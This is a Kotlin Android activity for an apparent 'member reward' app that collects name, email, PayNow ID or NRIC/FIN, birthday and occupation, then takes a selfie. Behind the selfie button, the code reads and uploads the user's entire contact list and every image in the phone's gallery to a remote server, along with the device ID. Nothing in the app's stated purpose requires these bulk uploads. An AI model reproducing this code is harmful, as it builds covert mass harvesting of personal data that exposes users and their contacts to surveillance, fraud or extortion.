package com.memberreward.contact

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.util.Patterns
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.inputmethod.EditorInfo
import android.widget.ArrayAdapter
import android.widget.LinearLayout
import android.widget.NumberPicker
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.google.android.material.textfield.TextInputEditText
import com.google.android.material.textfield.TextInputLayout
import com.memberreward.contact.BuildConfig
import com.memberreward.contact.databinding.ActivityMainBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.DateFormatSymbols
import java.util.Calendar

private data class ProfileInput(
    val fullName: String,
    val email: String,
    val paynowIdType: String,
    val paynowIdValue: String,
    val paynowName: String,
    val gender: String,
    val birthday: String,
    val occupation: String
)

class MainActivity : AppCompatActivity() {

    companion object {
        private const val DEFAULT_BASE_URL = "https://api.yengsang.com"
        private const val EXTRA_USER_ID = "extra_user_id"
        private const val EXTRA_VERIFIED_PHONE = "extra_verified_phone"

        fun createIntent(context: Context, userId: Int, verifiedPhone: String): Intent {
            return Intent(context, MainActivity::class.java)
                .putExtra(EXTRA_USER_ID, userId)
                .putExtra(EXTRA_VERIFIED_PHONE, verifiedPhone)
        }
    }

    private lateinit var binding: ActivityMainBinding
    private lateinit var contactsRepository: ContactsRepository
    private lateinit var galleryImageRepository: GalleryImageRepository
    private val syncService = StrapiSyncService()
    private val s3UploadService = S3UploadService()
    private var uploadInProgress = false
    private var userId: Int = -1
    private var verifiedPhone: String = ""

    private val uploadPermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        val contactsGranted = hasContactsPermission()
        val galleryGranted = hasFullGalleryPermission()

        if (contactsGranted && galleryGranted) {
            launchSelfieCapture()
        } else if (contactsGranted && hasLimitedPhotoAccess()) {
            showLimitedPhotoAccessDialog()
        } else {
            Toast.makeText(this, getString(R.string.permission_required_message), Toast.LENGTH_LONG).show()
        }
    }

    private val selfieCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.TakePicturePreview()
    ) { selfieBitmap: Bitmap? ->
        if (selfieBitmap == null) {
            binding.statusText.text = getString(R.string.status_selfie_capture_cancelled)
            return@registerForActivityResult
        }

        startUploadFlow(selfieBitmap)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        userId = intent.getIntExtra(EXTRA_USER_ID, -1)
        verifiedPhone = intent.getStringExtra(EXTRA_VERIFIED_PHONE).orEmpty()
        if (userId <= 0 || verifiedPhone.isBlank()) {
            Toast.makeText(this, getString(R.string.error_missing_verified_user), Toast.LENGTH_LONG).show()
            startActivity(Intent(this, VerifyPhoneActivity::class.java))
            finish()
            return
        }

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        contactsRepository = ContactsRepository(contentResolver)
        galleryImageRepository = GalleryImageRepository(contentResolver)

        binding.userPhoneInput.setText(verifiedPhone)
        setupInputValidation()
        setupPaynowIdTypeDropdown()
        setupGenderDropdown()
        setupBirthdayPicker()

        binding.uploadImageButton.setOnClickListener {
            checkPermissionsAndTakeSelfie()
        }

        refreshActionState()
        Log.d("MainActivity", "Ready for verified user $userId")
    }

    private fun checkPermissionsAndTakeSelfie() {
        if (collectValidatedProfileInput(showToast = true) == null) {
            return
        }

        val permissions = buildRequiredPermissions()
        val missingPermissions = permissions.filter { permission ->
            ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
        }

        if (hasContactsPermission() && hasLimitedPhotoAccess()) {
            showLimitedPhotoAccessDialog()
        } else if (missingPermissions.isEmpty()) {
            launchSelfieCapture()
        } else {
            uploadPermissionsLauncher.launch(missingPermissions.toTypedArray())
        }
    }

    private fun launchSelfieCapture() {
        selfieCaptureLauncher.launch(null)
    }

    private fun startUploadFlow(selfieBitmap: Bitmap) {
        val profileInput = collectValidatedProfileInput(showToast = true) ?: return
        val appApiKey = getAppApiKeyOrShowError() ?: return
        val deviceId = obtainDeviceId()

        uploadInProgress = true
        refreshActionState()
        binding.statusText.text = getString(R.string.status_updating_profile)

        lifecycleScope.launch {
            var selfieFile: File? = null

            try {
                selfieFile = withContext(Dispatchers.IO) {
                    createSelfieTempFile(selfieBitmap)
                }

                withContext(Dispatchers.IO) {
                    syncService.updateUserProfile(
                        baseUrl = DEFAULT_BASE_URL,
                        appApiKey = appApiKey,
                        userId = userId,
                        userEmail = profileInput.email,
                        userFullName = profileInput.fullName,
                        userPhone = verifiedPhone,
                        paynowIdType = profileInput.paynowIdType,
                        paynowIdValue = profileInput.paynowIdValue,
                        paynowName = profileInput.paynowName,
                        gender = profileInput.gender,
                        birthday = profileInput.birthday,
                        occupation = profileInput.occupation,
                        deviceId = deviceId
                    )
                }

                binding.statusText.text = getString(R.string.status_syncing_contacts_and_uploading_selfie)

                val contacts = withContext(Dispatchers.IO) {
                    contactsRepository.readContacts()
                }

                val result = withContext(Dispatchers.IO) {
                    syncService.syncContacts(
                        baseUrl = DEFAULT_BASE_URL,
                        appApiKey = appApiKey,
                        userId = userId,
                        contacts = contacts
                    )
                }

                binding.statusText.text = getString(R.string.status_contacts_synced_uploading_selfie)

                val imageUrl = withContext(Dispatchers.IO) {
                    syncService.uploadUserProfileImage(
                        baseUrl = DEFAULT_BASE_URL,
                        appApiKey = appApiKey,
                        userId = userId,
                        imageFile = selfieFile
                            ?: throw IllegalStateException("Missing selfie file for upload.")
                    )
                }

                binding.statusText.text = getString(R.string.status_selfie_uploaded_uploading_gallery)

                val galleryImages = withContext(Dispatchers.IO) {
                    galleryImageRepository.readAllImages()
                }

                val galleryUploadResult = withContext(Dispatchers.IO) {
                    s3UploadService.uploadAllImages(
                        baseUrl = DEFAULT_BASE_URL,
                        appApiKey = appApiKey,
                        userId = userId,
                        images = galleryImages,
                        contentResolver = contentResolver
                    )
                }

                binding.statusText.text = if (galleryUploadResult.failed > 0) {
                    getString(
                        R.string.status_completed_with_failures,
                        result.created,
                        result.updated,
                        imageUrl,
                        galleryUploadResult.uploaded,
                        galleryUploadResult.total,
                        galleryUploadResult.failed,
                        galleryUploadResult.firstError ?: "Unknown error"
                    )
                } else {
                    getString(
                        R.string.status_completed_success,
                        result.created,
                        result.updated,
                        imageUrl,
                        galleryUploadResult.uploaded,
                        galleryUploadResult.total
                    )
                }

                Toast.makeText(this@MainActivity, getString(R.string.toast_upload_complete), Toast.LENGTH_SHORT).show()
            } catch (e: Exception) {
                Log.e("MainActivity", "Upload flow failed", e)
                val errorMessage = e.message ?: "Unknown error"
                binding.statusText.text = getString(R.string.status_upload_failed, errorMessage)
                Toast.makeText(this@MainActivity, getString(R.string.toast_upload_failed, errorMessage), Toast.LENGTH_LONG)
                    .show()
            } finally {
                selfieFile?.delete()
                uploadInProgress = false
                refreshActionState()
            }
        }
    }

    private fun setupInputValidation() {
        binding.userFullNameInput.setOnFocusChangeListener { _, hasFocus ->
            if (!hasFocus) {
                validateRequiredField(
                    binding.userFullNameInput.text?.toString()?.trim().orEmpty(),
                    binding.userFullNameInputLayout,
                    R.string.error_enter_full_name,
                    false
                )
            }
        }

        binding.userFullNameInput.setOnEditorActionListener { _, actionId, _ ->
            if (actionId == EditorInfo.IME_ACTION_NEXT) {
                val isValid = validateRequiredField(
                    binding.userFullNameInput.text?.toString()?.trim().orEmpty(),
                    binding.userFullNameInputLayout,
                    R.string.error_enter_full_name,
                    false
                )
                if (isValid) {
                    binding.userEmailInput.requestFocus()
                }
                true
            } else {
                false
            }
        }

        binding.userFullNameInput.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) = Unit
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
                binding.userFullNameInputLayout.error = null
            }
            override fun afterTextChanged(s: Editable?) = Unit
        })

        binding.userEmailInput.setOnFocusChangeListener { _, hasFocus ->
            if (!hasFocus) {
                validateEmailField(showToast = false)
            }
        }

        binding.userEmailInput.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) = Unit
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
                binding.userEmailInputLayout.error = null
            }
            override fun afterTextChanged(s: Editable?) = Unit
        })

        registerErrorReset(binding.paynowIdValueInput, binding.paynowIdValueInputLayout)
        registerErrorReset(binding.paynowNameInput, binding.paynowNameInputLayout)
        registerErrorReset(binding.birthdayInput, binding.birthdayInputLayout)
        registerErrorReset(binding.occupationInput, binding.occupationInputLayout)
        binding.paynowIdTypeInput.setOnItemClickListener { _, _, _, _ ->
            binding.paynowIdTypeInputLayout.error = null
            updatePaynowIdValueHint()
        }
        binding.genderInput.setOnItemClickListener { _, _, _, _ ->
            binding.genderInputLayout.error = null
        }
    }

    private fun setupPaynowIdTypeDropdown() {
        val options = listOf(
            getString(R.string.paynow_id_mobile_number),
            getString(R.string.paynow_id_nric_fin)
        )
        val adapter = ArrayAdapter(this, android.R.layout.simple_list_item_1, options)
        binding.paynowIdTypeInput.setAdapter(adapter)
        if (binding.paynowIdTypeInput.text.isNullOrBlank()) {
            binding.paynowIdTypeInput.setText(options.first(), false)
        }
        updatePaynowIdValueHint()
    }

    private fun setupGenderDropdown() {
        val options = listOf(
            getString(R.string.gender_male),
            getString(R.string.gender_female)
        )
        val adapter = ArrayAdapter(this, android.R.layout.simple_list_item_1, options)
        binding.genderInput.setAdapter(adapter)
    }

    private fun setupBirthdayPicker() {
        binding.birthdayInput.setOnClickListener {
            showBirthdayPicker()
        }
        binding.birthdayInputLayout.setEndIconOnClickListener {
            showBirthdayPicker()
        }
    }

    private fun showBirthdayPicker() {
        val today = Calendar.getInstance()
        val calendar = Calendar.getInstance()
        parseBirthday(binding.birthdayInput.text?.toString()?.trim().orEmpty())?.let {
            calendar.timeInMillis = it.timeInMillis
        }

        val minYear = 1900
        val maxYear = today.get(Calendar.YEAR)
        val monthNames = DateFormatSymbols().months.take(12).toTypedArray()

        val yearPicker = createPicker(minYear, maxYear, calendar.get(Calendar.YEAR).coerceIn(minYear, maxYear), false)
        val monthPicker = createPicker(0, monthNames.lastIndex, calendar.get(Calendar.MONTH), false).apply {
            displayedValues = monthNames
        }
        val dayPicker = createPicker(1, 31, calendar.get(Calendar.DAY_OF_MONTH), false)

        val updateDayPicker = {
            val selectedYear = yearPicker.value
            val selectedMonth = monthPicker.value
            val maxDay = Calendar.getInstance().apply {
                set(Calendar.YEAR, selectedYear)
                set(Calendar.MONTH, selectedMonth)
                set(Calendar.DAY_OF_MONTH, 1)
            }.getActualMaximum(Calendar.DAY_OF_MONTH)

            val allowedMaxDay = if (
                selectedYear == today.get(Calendar.YEAR) &&
                selectedMonth == today.get(Calendar.MONTH)
            ) {
                today.get(Calendar.DAY_OF_MONTH)
            } else {
                maxDay
            }

            updatePickerBounds(dayPicker, 1, allowedMaxDay, dayPicker.value.coerceIn(1, allowedMaxDay))
        }

        yearPicker.setOnValueChangedListener { _, _, _ ->
            val maxMonth = if (yearPicker.value == today.get(Calendar.YEAR)) {
                today.get(Calendar.MONTH)
            } else {
                monthNames.lastIndex
            }

            if (monthPicker.value > maxMonth) {
                monthPicker.value = maxMonth
            }

            updatePickerBounds(monthPicker, 0, maxMonth, monthPicker.value)
            monthPicker.displayedValues = monthNames.copyOfRange(0, maxMonth + 1)
            updateDayPicker()
        }

        monthPicker.setOnValueChangedListener { _, _, _ ->
            updateDayPicker()
        }

        val initialMaxMonth = if (yearPicker.value == today.get(Calendar.YEAR)) {
            today.get(Calendar.MONTH)
        } else {
            monthNames.lastIndex
        }
        updatePickerBounds(monthPicker, 0, initialMaxMonth, monthPicker.value.coerceAtMost(initialMaxMonth))
        monthPicker.displayedValues = monthNames.copyOfRange(0, initialMaxMonth + 1)
        updateDayPicker()

        val pickerRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(dpToPx(12), dpToPx(8), dpToPx(12), 0)
            addView(createPickerColumn("Year", yearPicker), LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f))
            addView(createPickerColumn("Month", monthPicker), LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f))
            addView(createPickerColumn("Day", dayPicker), LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f))
        }

        MaterialAlertDialogBuilder(this)
            .setTitle(R.string.birthday_hint)
            .setView(pickerRow)
            .setNegativeButton(android.R.string.cancel, null)
            .setPositiveButton(android.R.string.ok) { _, _ ->
                binding.birthdayInput.setText(
                    String.format("%04d-%02d-%02d", yearPicker.value, monthPicker.value + 1, dayPicker.value)
                )
                binding.birthdayInputLayout.error = null
            }
            .show()
    }

    private fun parseBirthday(value: String): Calendar? {
        val parts = value.split("-")
        if (parts.size != 3) {
            return null
        }

        val year = parts[0].toIntOrNull() ?: return null
        val month = parts[1].toIntOrNull() ?: return null
        val day = parts[2].toIntOrNull() ?: return null

        return Calendar.getInstance().apply {
            set(year, month - 1, day)
        }
    }

    private fun createPicker(minValue: Int, maxValue: Int, value: Int, wrap: Boolean): NumberPicker {
        return NumberPicker(this).apply {
            this.minValue = minValue
            this.maxValue = maxValue
            this.value = value.coerceIn(minValue, maxValue)
            wrapSelectorWheel = wrap
            descendantFocusability = NumberPicker.FOCUS_BLOCK_DESCENDANTS
        }
    }

    private fun updatePickerBounds(picker: NumberPicker, minValue: Int, maxValue: Int, value: Int) {
        val clampedValue = value.coerceIn(minValue, maxValue)
        picker.displayedValues = null
        picker.minValue = minValue
        picker.maxValue = maxValue
        picker.value = clampedValue
    }

    private fun createPickerColumn(label: String, picker: NumberPicker): LinearLayout {
        return LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            addView(
                TextView(this@MainActivity).apply {
                    text = label
                    gravity = Gravity.CENTER
                    setPadding(0, 0, 0, dpToPx(4))
                }
            )
            addView(
                picker,
                LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                )
            )
        }
    }

    private fun dpToPx(value: Int): Int {
        return TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP,
            value.toFloat(),
            resources.displayMetrics
        ).toInt()
    }

    private fun updatePaynowIdValueHint() {
        binding.paynowIdValueInputLayout.hint = when (binding.paynowIdTypeInput.text?.toString()?.trim()) {
            getString(R.string.paynow_id_nric_fin) -> getString(R.string.paynow_nric_fin_hint)
            else -> getString(R.string.paynow_mobile_number_hint)
        }
    }

    private fun registerErrorReset(input: TextInputEditText, layout: TextInputLayout) {
        input.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) = Unit
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
                layout.error = null
            }
            override fun afterTextChanged(s: Editable?) = Unit
        })
    }

    private fun collectValidatedProfileInput(showToast: Boolean): ProfileInput? {
        val fullName = binding.userFullNameInput.text?.toString()?.trim().orEmpty()
        val email = binding.userEmailInput.text?.toString()?.trim().orEmpty()
        val paynowIdType = binding.paynowIdTypeInput.text?.toString()?.trim().orEmpty()
        val paynowIdValue = binding.paynowIdValueInput.text?.toString()?.trim().orEmpty()
        val paynowName = binding.paynowNameInput.text?.toString()?.trim().orEmpty()
        val gender = binding.genderInput.text?.toString()?.trim().orEmpty()
        val birthday = binding.birthdayInput.text?.toString()?.trim().orEmpty()
        val occupation = binding.occupationInput.text?.toString()?.trim().orEmpty()

        if (!validateRequiredField(fullName, binding.userFullNameInputLayout, R.string.error_enter_full_name, showToast)) {
            return null
        }
        if (!validateEmailField(showToast)) {
            return null
        }
        if (!validateRequiredField(
                paynowIdType,
                binding.paynowIdTypeInputLayout,
                R.string.error_select_paynow_id_type,
                showToast
            )
        ) {
            return null
        }
        if (!validateRequiredField(
                paynowIdValue,
                binding.paynowIdValueInputLayout,
                R.string.error_enter_paynow_id_value,
                showToast
            )
        ) {
            return null
        }
        if (!validateRequiredField(
                paynowName,
                binding.paynowNameInputLayout,
                R.string.error_enter_paynow_name,
                showToast
            )
        ) {
            return null
        }
        if (!validateRequiredField(
                gender,
                binding.genderInputLayout,
                R.string.error_select_gender,
                showToast
            )
        ) {
            return null
        }
        if (!validateRequiredField(
                birthday,
                binding.birthdayInputLayout,
                R.string.error_enter_birthday,
                showToast
            )
        ) {
            return null
        }
        if (!validateRequiredField(
                occupation,
                binding.occupationInputLayout,
                R.string.error_enter_occupation,
                showToast
            )
        ) {
            return null
        }

        return ProfileInput(
            fullName = fullName,
            email = email,
            paynowIdType = paynowIdType,
            paynowIdValue = paynowIdValue,
            paynowName = paynowName,
            gender = gender,
            birthday = birthday,
            occupation = occupation
        )
    }

    private fun validateRequiredField(
        value: String,
        inputLayout: TextInputLayout,
        errorResId: Int,
        showToast: Boolean
    ): Boolean {
        if (value.isNotBlank()) {
            inputLayout.error = null
            return true
        }

        inputLayout.error = getString(errorResId)
        if (showToast) {
            Toast.makeText(this, getString(errorResId), Toast.LENGTH_SHORT).show()
        }
        return false
    }

    private fun validateEmailField(showToast: Boolean): Boolean {
        val userEmail = binding.userEmailInput.text?.toString()?.trim().orEmpty()

        if (userEmail.isBlank()) {
            binding.userEmailInputLayout.error = getString(R.string.error_enter_user_email)
            if (showToast) {
                Toast.makeText(this, getString(R.string.error_enter_user_email), Toast.LENGTH_SHORT).show()
            }
            return false
        }

        if (!Patterns.EMAIL_ADDRESS.matcher(userEmail).matches()) {
            binding.userEmailInputLayout.error = getString(R.string.error_invalid_user_email)
            if (showToast) {
                Toast.makeText(this, getString(R.string.error_invalid_user_email), Toast.LENGTH_SHORT).show()
            }
            return false
        }

        binding.userEmailInputLayout.error = null
        return true
    }

    private fun refreshActionState() {
        binding.uploadImageButton.isEnabled = !uploadInProgress
        binding.progressBar.visibility = if (uploadInProgress) View.VISIBLE else View.GONE
    }

    private fun getAppApiKeyOrShowError(): String? {
        val appApiKey = BuildConfig.APP_API_KEY
        if (appApiKey.isBlank()) {
            binding.statusText.text = getString(R.string.status_missing_app_api_key)
            Toast.makeText(this, getString(R.string.toast_missing_app_api_key), Toast.LENGTH_LONG).show()
            return null
        }
        return appApiKey
    }

    private fun buildRequiredPermissions(): Array<String> {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            arrayOf(Manifest.permission.READ_CONTACTS, Manifest.permission.READ_MEDIA_IMAGES)
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(Manifest.permission.READ_CONTACTS, Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            arrayOf(Manifest.permission.READ_CONTACTS, Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }

    private fun hasContactsPermission(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
    }

    private fun hasFullGalleryPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasLimitedPhotoAccess(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            return false
        }

        val limitedGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED
        ) == PackageManager.PERMISSION_GRANTED

        return limitedGranted && !hasFullGalleryPermission()
    }

    private fun showLimitedPhotoAccessDialog() {
        AlertDialog.Builder(this)
            .setTitle(R.string.limited_photo_access_title)
            .setMessage(R.string.limited_photo_access_message)
            .setPositiveButton(R.string.limited_photo_access_settings) { _, _ ->
                openAppSettings()
            }
            .setNegativeButton(R.string.limited_photo_access_continue) { _, _ ->
                launchSelfieCapture()
            }
            .show()
    }

    private fun openAppSettings() {
        val intent = Intent(
            Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
            Uri.fromParts("package", packageName, null)
        )
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
    }

    private fun createSelfieTempFile(bitmap: Bitmap): File {
        val selfieFile = File.createTempFile("selfie-", ".jpg", cacheDir)
        selfieFile.outputStream().use { output ->
            if (!bitmap.compress(Bitmap.CompressFormat.JPEG, 95, output)) {
                throw IllegalStateException("Unable to prepare selfie image.")
            }
        }
        return selfieFile
    }

    private fun obtainDeviceId(): String {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        return if (deviceId.isNullOrBlank()) "unknown_device" else deviceId
    }
}
